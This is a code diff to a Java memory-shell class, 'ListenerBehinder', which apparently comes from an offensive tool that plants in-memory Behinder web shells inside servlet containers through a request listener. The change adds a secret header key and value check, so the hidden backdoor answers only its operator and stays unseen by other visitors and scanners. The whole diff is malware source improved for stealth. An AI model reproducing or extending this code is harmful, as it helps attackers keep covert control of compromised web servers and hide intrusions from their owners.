@@ -17,9 +17,11 @@ import java.util.Map;
  */
 @MemShell(MemShell.Listener)
 @MemShellFunction(MemShellFunction.Behinder)
-@JavaClassModifiable({JavaClassModifiable.pass})
+@JavaClassModifiable({JavaClassModifiable.pass, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class ListenerBehinder implements InvocationHandler {
     private static String pass;
+    private String lockHeaderKey;
+    private String lockHeaderValue;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("requestInitialized")) {
@@ -35,6 +37,9 @@ public class ListenerBehinder implements InvocationHandler {
     private void run(Object sre) {
         try {
             Object request = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
+            if(!((String)invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+                return;
+            }
             Object response = getResponse(request);
 
             String method = (String) invokeMethod(request, "getMethod", new Class[]{}, new Object[]{});
